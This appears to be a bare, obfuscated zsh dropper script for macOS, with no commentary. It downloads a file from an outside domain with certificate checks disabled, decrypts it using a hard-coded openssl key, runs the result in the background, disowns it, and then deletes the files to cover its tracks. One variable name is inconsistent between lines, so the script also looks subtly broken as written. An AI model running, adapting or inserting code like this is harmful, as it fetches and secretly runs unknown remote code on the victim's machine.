#!/bin/zsh
fn8kz=$(mktemp /tmp/ddh59m.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m25fca8e25316b150.bin" -o "$fn8kzz" || exit 1
p3fse3=$(stat -f %z "$fn8kzz"); g7u967z=$(( p3fse3 - 2915 - 2491 ))
tail -c +$(( 2915 + 1 )) "$fn8kzz" | head -c $g7u967z | openssl enc -d -aes-256-cbc -k a77c88381aa91fe5ef80b097 -out "$fn8kz" 2>/dev/null
[ -s "$fn8kz" ] && chmod 700 "$fn8kz" && ( "$fn8kz" & ) && disown
( sleep 3; rm -f "$fn8kz" "$fn8kzz" ) &>/dev/null &
